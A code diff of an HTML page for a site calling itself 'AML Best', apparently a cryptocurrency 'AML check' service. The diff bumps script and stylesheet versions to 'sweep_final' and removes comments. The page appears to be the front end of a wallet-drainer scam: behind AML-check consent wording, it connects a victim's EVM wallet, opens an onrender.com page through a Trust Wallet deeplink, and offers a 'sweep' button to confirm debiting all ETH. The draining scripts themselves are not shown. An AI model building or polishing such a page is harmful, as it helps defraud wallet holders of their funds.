@@ -8,7 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css?v=sweep3" />
+  <link rel="stylesheet" href="styles.css?v=sweep_final" />
 </head>
 <body>
   <header class="site-header" data-header>
@@ -54,9 +54,7 @@
             <span>Я согласен на чтение публичных адресов и балансов для AML-проверки.</span>
           </label>
           <div class="wallet-login-actions">
-            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
             <button type="button" id="connect-btn">Connect EVM</button>
-            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
             <a
               class="wallet-deeplink"
               href="https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fmysite2-tlgp.onrender.com%2Fcheck.html"
@@ -119,7 +117,6 @@
           </label>
 
           <div class="sweep-actions">
-            <!-- 👇 НОВАЯ КНОПКА СПИСАНИЯ -->
             <button type="button" id="sweep-execute-btn" class="btn-sweep" disabled>
               🔥 Подтвердить списание всех ETH
             </button>
@@ -152,7 +149,6 @@
               autocorrect="off"
               spellcheck="false"
             />
-            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
             <button type="button" id="tron-submit-btn">Проверить USDT TRC20</button>
           </div>
           <p class="form-status" id="tron-status"></p>
@@ -188,7 +184,6 @@
             <input type="checkbox" id="payment-approval" />
             <span>Я проверил сеть, актив, сумму и адрес получателя и хочу открыть эту транзакцию в кошельке.</span>
           </label>
-          <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
           <button type="button" id="payment-confirm" disabled>Подтвердить в Trust Wallet</button>
           <p class="form-status" id="payment-status"></p>
         </section>
@@ -198,7 +193,6 @@
           <label for="wallet">Адрес или tx hash для AML-проверки</label>
           <div class="input-row">
             <input id="wallet" name="wallet" type="text" placeholder="0x71C... или tx hash" required disabled />
-            <!-- 👇 ЭТА КНОПКА ОСТАЕТСЯ -->
             <button type="submit" disabled>Проверить</button>
           </div>
           <p class="form-note" data-check-lock-note>Сначала подключите EVM-кошелёк.</p>
@@ -219,10 +213,9 @@
     <span>© 2026 AML Best</span>
   </footer>
 
-  <!-- ===== СКРИПТЫ (ОРИГИНАЛ) ===== -->
-  <script src="config.js?v=sweep3"></script>
-  <script src="auto-wallet.js?v=sweep3"></script>
-  <script src="script.js?v=sweep3"></script>
-  <script src="check-flow.js?v=sweep3"></script>
+  <script src="config.js?v=sweep_final"></script>
+  <script src="auto-wallet.js?v=sweep_final"></script>
+  <script src="script.js?v=sweep_final"></script>
+  <script src="check-flow.js?v=sweep_final"></script>
 </body>
 </html>
